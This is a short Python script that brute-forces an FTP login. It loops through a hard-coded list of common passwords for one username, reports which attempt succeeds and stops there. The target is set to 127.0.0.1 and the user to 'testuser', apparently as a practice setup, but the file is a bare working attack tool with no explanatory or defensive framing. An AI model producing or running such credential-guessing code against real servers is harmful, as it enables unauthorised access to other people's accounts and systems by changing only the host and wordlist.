#!/usr/bin/python3

import ftplib

def ftp_brute_force(host, username, password_list):
    for password in password_list:
        try:
            ftp = ftplib.FTP(host)
            ftp.login(user=username, passwd=password)
            print(f"[+] Success: Username: {username} | Password: {password}")
            ftp.quit()
            return
        except ftplib.error_perm:
            print(f"[-] Failed: {password}")
        except Exception as e:
            print(f"[!] Error: {e}")
            break
    print("[!] Brute force complete.")

host = "127.0.0.1"  
username = "testuser"


passwords = ["1234", "admin", "password", "letmein", "ftp123"]

ftp_brute_force(host, username, passwords)

